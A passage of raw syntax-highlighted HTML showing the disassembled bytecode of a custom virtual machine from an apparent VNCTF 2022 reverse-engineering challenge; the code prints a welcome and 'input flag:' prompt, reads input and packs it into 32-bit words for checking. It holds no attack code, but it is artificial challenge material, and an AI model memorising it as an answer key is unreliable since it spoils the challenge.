class="hljs-number">32</span></span><br><span class="line"><span class="hljs-attribute">51</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">54</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">116</span></span><br><span class="line"><span class="hljs-attribute">57</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">60</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">111</span></span><br><span class="line"><span class="hljs-attribute">63</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">66</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">32</span></span><br><span class="line"><span class="hljs-attribute">69</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">72</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">86</span></span><br><span class="line"><span class="hljs-attribute">75</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">78</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">78</span></span><br><span class="line"><span class="hljs-attribute">81</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">84</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">67</span></span><br><span class="line"><span class="hljs-attribute">87</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">90</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">84</span></span><br><span class="line"><span class="hljs-attribute">93</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">96</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">70</span></span><br><span class="line"><span class="hljs-attribute">99</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">102</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">50</span></span><br><span class="line"><span class="hljs-attribute">105</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">108</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">48</span></span><br><span class="line"><span class="hljs-attribute">111</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">114</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">50</span></span><br><span class="line"><span class="hljs-attribute">117</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">120</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">50</span></span><br><span class="line"><span class="hljs-attribute">123</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">126</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">33</span></span><br><span class="line"><span class="hljs-attribute">129</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">132</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-attribute">135</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">138</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">105</span></span><br><span class="line"><span class="hljs-attribute">141</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">144</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">110</span></span><br><span class="line"><span class="hljs-attribute">147</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">150</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">112</span></span><br><span class="line"><span class="hljs-attribute">153</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">156</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">117</span></span><br><span class="line"><span class="hljs-attribute">159</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">162</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">116</span></span><br><span class="line"><span class="hljs-attribute">165</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">168</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">32</span></span><br><span class="line"><span class="hljs-attribute">171</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">174</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">102</span></span><br><span class="line"><span class="hljs-attribute">177</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">180</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">108</span></span><br><span class="line"><span class="hljs-attribute">183</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">186</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">97</span></span><br><span class="line"><span class="hljs-attribute">189</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">192</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">103</span></span><br><span class="line"><span class="hljs-attribute">195</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">198</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">58</span></span><br><span class="line"><span class="hljs-attribute">201</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">204</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-attribute">207</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">210</span> arr[<span class="hljs-number">19</span>]=<span class="hljs-number">73</span></span><br><span class="line"><span class="hljs-attribute">213</span> arr[<span class="hljs-number">3</span>]=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">216</span> arr[<span class="hljs-number">1</span>]=<span class="hljs-number">43</span></span><br><span class="line"><span class="hljs-attribute">219</span> arr[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attribute">222</span> arr[<span class="hljs-number">0</span>]=getchar()</span><br><span class="line"><span class="hljs-attribute">225</span> push arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">228</span> arr[<span class="hljs-number">1</span>]-=arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">231</span> if arr[<span class="hljs-number">1</span>]!=arr[<span class="hljs-number">3</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">234</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">237</span> push arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">240</span> nop</span><br><span class="line"><span class="hljs-attribute">243</span> nop</span><br><span class="line"><span class="hljs-attribute">246</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">249</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">252</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">255</span> arr[<span class="hljs-number">6</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">258</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">261</span> arr[<span class="hljs-number">6</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">264</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-attribute">267</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">270</span> arr[<span class="hljs-number">6</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">273</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">276</span> arr[<span class="hljs-number">6</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">279</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-attribute">282</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">285</span> arr[<span class="hljs-number">6</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">288</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">291</span> arr[<span class="hljs-number">6</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">294</span> nop</span><br><span class="line"><span class="hljs-attribute">297</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">300</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">303</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">306</span> arr[<span class="hljs-number">7</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">309</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">312</span> arr[<span class="hljs-number">7</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">315</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">7</span>]</span><br><span class="line"><span class="hljs-attribute">318</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">321</span> arr[<span class="hljs-number">7</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">324</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">327</span> arr[<span class="hljs-number">7</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">330</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">7</span>]</span><br><span class="line"><span class="hljs-attribute">333</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">336</span> arr[<span class="hljs-number">7</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">339</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">342</span> arr[<span class="hljs-number">7</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">345</span> nop</span><br><span class="line"><span class="hljs-attribute">348</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">351</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">354</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">357</span> arr[<span class="hljs-number">8</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">360</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">363</span> arr[<span class="hljs-number">8</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">366</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">8</span>]</span><br><span class="line"><span class="hljs-attribute">369</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">372</span> arr[<span class="hljs-number">8</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">375</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">378</span> arr[<span class="hljs-number">8</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">381</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">8</span>]</span><br><span class="line"><span class="hljs-attribute">384</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">387</span> arr[<span class="hljs-number">8</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">390</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">393</span> arr[<span class="hljs-number">8</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">396</span> nop</span><br><span class="line"><span class="hljs-attribute">399</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">402</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">405</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">408</span> arr[<span class="hljs-number">9</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">411</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">414</span> arr[<span class="hljs-number">9</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">417</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">9</span>]</span><br><span class="line"><span class="hljs-attribute">420</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">423</span> arr[<span class="hljs-number">9</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">426</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">429</span> arr[<span class="hljs-number">9</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">432</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">9</span>]</span><br><span class="line"><span class="hljs-attribute">435</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">438</span> arr[<span class="hljs-number">9</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">441</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">444</span> arr[<span class="hljs-number">9</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">447</span> nop</span><br><span class="line"><span class="hljs-attribute">450</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">453</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">456</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">459</span> arr[<span class="hljs-number">10</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">462</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">465</span> arr[<span class="hljs-number">10</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">468</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">10</span>]</span><br><span class="line"><span class="hljs-attribute">471</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">474</span> arr[<span class="hljs-number">10</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">477</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">480</span> arr[<span class="hljs-number">10</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">483</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">10</span>]</span><br><span class="line"><span class="hljs-attribute">486</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">489</span> arr[<span class="hljs-number">10</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">492</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">495</span> arr[<span class="hljs-number">10</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">498</span> nop</span><br><span class="line"><span class="hljs-attribute">501</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">504</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">507</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">510</span> arr[<span class="hljs-number">11</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">513</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">516</span> arr[<span class="hljs-number">11</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">519</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">11</span>]</span><br><span class="line"><span class="hljs-attribute">522</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">525</span> arr[<span class="hljs-number">11</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">528</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">531</span> arr[<span class="hljs-number">11</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">534</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">11</span>]</span><br><span class="line"><span class="hljs-attribute">537</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">540</span> arr[<span class="hljs-number">11</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">543</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">546</span> arr[<span class="hljs-number">11</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">549</span> nop</span><br><span class="line"><span class="hljs-attribute">552</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">555</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">558</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">561</span> arr[<span class="hljs-number">12</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">564</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">567</span> arr[<span class="hljs-number">12</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">570</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">12</span>]</span><br><span class="line"><span class="hljs-attribute">573</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">576</span> arr[<span class="hljs-number">12</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">579</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">582</span> arr[<span class="hljs-number">12</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">585</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">12</span>]</span><br><span class="line"><span class="hljs-attribute">588</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">591</span> arr[<span class="hljs-number">12</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">594</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">597</span> arr[<span class="hljs-number">12</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">600</span> nop</span><br><span class="line"><span class="hljs-attribute">603</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">606</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">609</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">612</span> arr[<span class="hljs-number">13</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">615</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">618</span> arr[<span class="hljs-number">13</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">621</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">13</span>]</span><br><span class="line"><span class="hljs-attribute">624</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">627</span> arr[<span class="hljs-number">13</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">630</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">633</span> arr[<span class="hljs-number">13</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">636</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">13</span>]</span><br><span class="line"><span class="hljs-attribute">639</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">642</span> arr[<span class="hljs-number">13</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">645</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">648</span> arr[<span class="hljs-number">13</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">651</span> nop</span><br><span class="line"><span class="hljs-attribute">654</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">657</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">660</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">663</span> arr[<span class="hljs-number">14</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">666</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">669</span> arr[<span class="hljs-number">14</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">672</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">14</span>]</span><br><span class="line"><span class="hljs-attribute">675</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">678</span> arr[<span class="hljs-number">14</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">681</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">684</span> arr[<span class="hljs-number">14</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">687</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">14</span>]</span><br><span class="line"><span class="hljs-attribute">690</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">693</span> arr[<span class="hljs-number">14</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">696</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">699</span> arr[<span class="hljs-number">14</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">702</span> nop</span><br><span class="line"><span class="hljs-attribute">705</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">708</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">711</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">714</span> arr[<span class="hljs-number">15</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">717</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">720</span> arr[<span class="hljs-number">15</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">723</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">15</span>]</span><br><span class="line"><span class="hljs-attribute">726</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">729</span> arr[<span class="hljs-number">15</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">732</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">735</span> arr[<span class="hljs-number">15</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">738</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">15</span>]</span><br><span class="line"><span class="hljs-attribute">741</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">744</span> arr[<span class="hljs-number">15</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">747</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">750</span> arr[<span class="hljs-number">15</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">753</span> nop</span><br><span class="line"><span class="hljs-attribute">756</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">759</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">256</span></span><br><span class="line"><span class="hljs-attribute">762</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">765</span> arr[<span class="hljs-number">16</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">768</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">771</span> arr[<span class="hljs-number">16</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">774</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">16</span>]</span><br><span class="line"><span class="hljs-attribute">777</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">780</span> arr[<span class="hljs-number">16</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">783</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">786</span> arr[<span class="hljs-number">16</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">789</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">16</span>]</span><br><span class="line"><span class="hljs-attribute">792</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">795</span> arr[<span class="hljs-number">16</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">798</span> pop arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">801</span> arr[<span class="hljs-number">16</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">804</span> nop</span><br><span class="line"><span class="hljs-attribute">807</span> push arr[<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-attribute">810</span> push arr[<span class="hljs-number">7</span>]</span><br><span class="line"><span class="hljs-attribute">813</span> push arr[<span class="hljs-number">8</span>]</span><br><span class="line"><span class="hljs-attribute">816</span> push arr[<span class="hljs-number">9</span>]</span><br><span class="line"><span class="hljs-attribute">819</span> push arr[<span class="hljs-number">10</span>]</span><br><span class="line"><span class="hljs-attribute">822</span> push arr[<span class="hljs-number">11</span>]</span><br><span class="line"><span class="hljs-attribute">825</span> push arr[<span class="hljs-number">12</span>]</span><br><span class="line"><span class="hljs-attribute">828</span> push arr[<span class="hljs-number">13</span>]</span><br><span class="line"><span class="hljs-attribute">831</span> push arr[<span class="hljs-number">14</span>]</span><br><span class="line"><span class="hljs-attribute">834</span> push arr[<span class="hljs-number">15</span>]</span><br><span class="line"><span class="hljs-attribute">837</span> push arr[<span class="hljs-number">16</span>]</span><br><span class="line"><span class="hljs-attribute">840</span> pop arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">843</span> pop arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">846</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">284</span></span><br><span class="line"><span class="hljs-attribute">849</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">340</span></span><br><span class="line"><span class="hljs-attribute">852</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">855</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">3906065887</span></span><br><span class="line"><span 